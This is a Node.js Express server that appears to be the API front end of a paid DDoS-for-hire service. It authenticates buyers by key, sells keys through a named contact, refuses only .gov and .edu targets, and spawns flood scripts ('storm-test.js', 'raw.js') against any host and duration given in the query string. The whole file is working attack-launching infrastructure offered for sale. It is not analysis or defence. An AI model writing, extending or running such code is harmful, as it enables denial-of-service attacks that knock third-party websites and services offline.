const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

let allowedKeys = [];
const blacklistedUsers = {};
const keyBanList = [];
const maxViolations = 2;

// �?c danh s�ch key b? c?m t? t?p van b?n (n?u c�)
fs.readFile('KeyBanList.txt', 'utf8', (err, data) => {
  if (!err && data) {
    const lines = data.split('\n');
    lines.forEach(line => {
      const [key] = line.trim().split(':');
      if (key) {
        keyBanList.push(key);
      }
    });
  }
});

// �?c danh s�ch allowed keys t? t?p van b?n
fs.readFile('allowedkeys.txt', 'utf8', (err, data) => {
  if (!err && data) {
    allowedKeys = data.split('\n').map(key => key.trim());
  }
});

app.get('/', (req, res) => {
  try {
    const host = req.query.host;
    const time = req.query.time;
    const method = req.query.method;
    const requests = req.query.requests;
    const userKey = req.query.key;

    const clientIPv6 = req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');

    if (keyBanList.includes(userKey)) {
      console.error(`UserBanned!! This User Is Trying to violate the blacklist target and got banned!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
      return res.status(403).send('Your Key Got Banned LOL! Contact @nck0666 to buy a new key.');
    }

    if (!allowedKeys.includes(userKey)) {
      if (blacklistedUsers[clientIPv6]) {
        blacklistedUsers[clientIPv6].violations++;
        console.error(`UserBanned!! This User Is Trying to violate the blacklist target and got banned!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
      } else {
        blacklistedUsers[clientIPv6] = {
          violations: 1,
          userAgent,
          key: userKey
        };
        console.error(`WARNING!! Someone violate our rules!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
      }

      if (blacklistedUsers[clientIPv6].violations >= maxViolations) {
        console.error(`UserBanned!! This User Is Trying to violate the blacklist target and got banned!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
        keyBanList.push(userKey);

        // Ghi danh s�ch key b? c?m v�o t?p van b?n
        const keyBanListData = keyBanList.join('\n');
        fs.writeFile('KeyBanList.txt', keyBanListData, 'utf8', (err) => {
          if (err) {
            console.error('Failed to write to KeyBanList.txt');
          }
        });

        return res.status(403).send('User is blocked.');
      }

      return res.status(401).send('Key not working');
    }

    if (/\.gov|\.edu/.test(host)) {
      if (blacklistedUsers[clientIPv6]) {
        blacklistedUsers[clientIPv6].violations++;
        console.error(`UserBanned!! This User Is Trying to violate the blacklist target and got banned!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
      } else {
        blacklistedUsers[clientIPv6] = {
          violations: 1,
          userAgent,
          key: userKey
        };
        console.error(`WARNING!! Someone violate our rules!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
      }

      if (blacklistedUsers[clientIPv6].violations >= maxViolations) {
        console.error(`UserBanned!! This User Is Trying to violate the blacklist target and got banned!\nIPv6: ${clientIPv6}\nUser-Agent: ${userAgent}\nKey User: ${userKey}`);
        keyBanList.push(userKey);

        // Ghi danh s�ch key b? c?m v�o t?p van b?n
        const keyBanListData = keyBanList.join('\n');
        fs.writeFile('KeyBanList.txt', keyBanListData, 'utf8', (err) => {
          if (err) {
            console.error('Failed to write to KeyBanList.txt');
          }
        });

        return res.status(403).send('Your Key Got Banned LOL! Contact @nck0666 to buy a new key.');
      }

      return res.status(403).send('Host is blacklisted Remind Blacklisted host is startwith .gov/.edu.');
    }

    if (method === 'bypass') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['storm-test.js', host, time, 65, 3, 'output.txt', 'true']);
    } else if (method === 'https') {
       const spawn = require('child_process').spawn;
       const ls = spawn('node', ['raw.js', host, time, 3, 'live.txt', 65, 'bypass']);
      // �ua ra code cho method https-browser v?i c�c bi?n d� du?c d?nh nghia tru?c d�
      // ...
    } else {
      res.status(400).send('Incorrect method.');
    }
  } catch (error) {
    res.status(500).send('There is a problem.');
  }
});

app.listen(port, () => {
  console.log(`API working on ${port} port`);
});